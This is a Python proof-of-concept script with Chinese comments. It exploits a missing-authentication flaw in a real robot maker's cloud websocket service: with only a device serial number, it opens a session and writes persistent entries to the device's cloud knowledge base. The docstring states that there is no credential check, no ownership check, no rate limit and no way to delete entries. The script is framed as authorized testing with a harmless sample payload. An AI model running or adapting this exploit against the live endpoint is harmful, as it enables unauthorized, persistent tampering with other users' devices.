#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""云端知识库未授权写入 PoC(自有 SN 授权测试)
链: wss://gpt-proxy.unitree.com:6080 —— 会话唯一身份 = 消息内 SN(无凭据)
    set_user_knowledge 无内容过滤、无归属校验、无速率限制 → 任意内容写入云端
证据要点: 写入静默成功(差异证明: 未知 cmd 立即 KeyError);
         持久化(历史条目留存 + delete 崩溃无法清除)
"""
import asyncio, json, ssl, websockets

WSS = "wss://gpt-proxy.unitree.com:6080/api/agent/stream"
SN = "<GO2设备_01>"
CONTENT = "[安全审计PoC] 授权测试写入验证样本,无害,请忽略。"

async def main():
    ssl_ctx = ssl.create_default_context()
    async with websockets.connect(WSS, ssl=ssl_ctx, ping_interval=20) as ws:
        await ws.send(json.dumps({"cmd": "set_basic_info", "api": "r1_pub", "data": {
            "sn": SN, "country": "CN", "lang": "cn", "model": "gpt-4.1"}}))
        await asyncio.sleep(1)
        print('[1] 会话建立(仅凭 SN,无任何凭据)')

        print('[2] 写入知识库条目 ...')
        await ws.send(json.dumps({"cmd": "set_user_knowledge", "api": "r1_pub",
                                  "data": {"content": CONTENT}}))
        try:
            while True:
                raw = await asyncio.wait_for(ws.recv(), 15)
                print('    回包:', raw[:200])
        except asyncio.TimeoutError:
            print('    回包: 无(静默接受)')

        print('[3] 对照: 未知 cmd(预期 KeyError traceback = 证明分发表差异)')
        await ws.send(json.dumps({"cmd": "cmd_not_exist", "api": "r1_pub", "data": {}}))
        try:
            print('    回包:', (await asyncio.wait_for(ws.recv(), 8))[:200])
        except asyncio.TimeoutError:
            print('    (无回包)')
        print('[*] 写入静默成功 + 未知 cmd 即错 = set_user_knowledge 被服务端接受执行')

asyncio.run(main())
